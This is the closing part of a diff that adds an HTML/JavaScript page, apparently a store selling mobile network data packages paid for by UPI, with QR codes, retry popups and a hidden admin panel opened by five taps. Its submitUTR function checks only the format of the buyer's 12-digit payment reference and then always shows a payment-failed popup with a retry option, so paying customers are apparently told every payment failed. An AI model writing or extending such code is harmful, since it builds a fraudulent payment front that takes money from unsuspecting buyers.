+                        <button class="btn-cancel" style="flex:1;justify-content:center;" onclick="goHome()"><i class="fas fa-times"></i> Cancel</button>
+                    </div>
+
+                    <div style="margin-top:0.8rem;font-size:0.6rem;color:#6a8a9a;text-align:center;">
+                        <i class="fas fa-info-circle"></i> UTR is the 12-digit reference number from your payment
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    function submitUTR() {
+        const utr = document.getElementById('utrInput')?.value.trim();
+        const error = document.getElementById('utrError');
+
+        if (!utr || utr.length < 12) {
+            if (error) {
+                error.textContent = 'Please enter all 12 digits';
+                error.classList.add('show');
+            }
+            showToast('Please enter a valid 12-digit UTR number');
+            return;
+        }
+
+        if (utr.length !== 12 || !/^\d{12}$/.test(utr)) {
+            if (error) {
+                error.textContent = 'UTR must be exactly 12 digits';
+                error.classList.add('show');
+            }
+            showToast('UTR must be exactly 12 digits');
+            return;
+        }
+
+        showLoadingTransition(() => {
+            showFailPopup();
+        });
+    }
+
+    // ========== NAVIGATION ==========
+    function goHome() {
+        selectedPackage = null;
+        currentView = 'home';
+        render();
+    }
+
+    function switchNetwork(net) {
+        activeNetwork = net;
+        currentView = 'home';
+        render();
+    }
+
+    function openSupport() {
+        document.getElementById('support')?.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    // ========== ADMIN TAP HANDLER ==========
+    function adminTapHandler(event) {
+        event.preventDefault();
+        event.stopPropagation();
+        adminTapCount++;
+        clearTimeout(adminTapTimeout);
+        adminTapTimeout = setTimeout(() => { adminTapCount = 0; }, 3000);
+        if (adminTapCount >= 5) {
+            adminTapCount = 0;
+            openAdminPanel();
+        }
+    }
+
+    // ========== INIT ==========
+    document.addEventListener('DOMContentLoaded', () => {
+        render();
+        setTimeout(() => {
+            const fill = document.getElementById('welcomeProgress');
+            if (fill) fill.style.width = '100%';
+        }, 300);
+    });
+
+    // Expose functions
+    window.enterApp = enterApp;
+    window.goHome = goHome;
+    window.switchNetwork = switchNetwork;
+    window.openSupport = openSupport;
+    window.handleBuyNowWithAnimation = handleBuyNowWithAnimation;
+    window.confirmPayment = confirmPayment;
+    window.cancelPayment = cancelPayment;
+    window.submitUTR = submitUTR;
+    window.copyUPI = copyUPI;
+    window.openAdminPanel = openAdminPanel;
+    window.closeAdminPanel = closeAdminPanel;
+    window.addPlan = addPlan;
+    window.deletePlan = deletePlan;
+    window.saveAdminChanges = saveAdminChanges;
+    window.adminTapHandler = adminTapHandler;
+    window.showToast = showToast;
+    window.renderAdminPanel = renderAdminPanel;
+    window.generateQR = generateQR;
+    window.downloadQR = downloadQR;
+    window.showFailPopup = showFailPopup;
+    window.closeFailPopupAndRetry = closeFailPopupAndRetry;
+    window.closeFailPopupAndGoHome = closeFailPopupAndGoHome;
+    window.showSuccessPopup = showSuccessPopup;
+    window.closeSuccessPopup = closeSuccessPopup;
+    window.showLogoutPopup = showLogoutPopup;
+    window.closeLogoutPopup = closeLogoutPopup;
+    window.confirmLogout = confirmLogout;
+</script>
+</html>
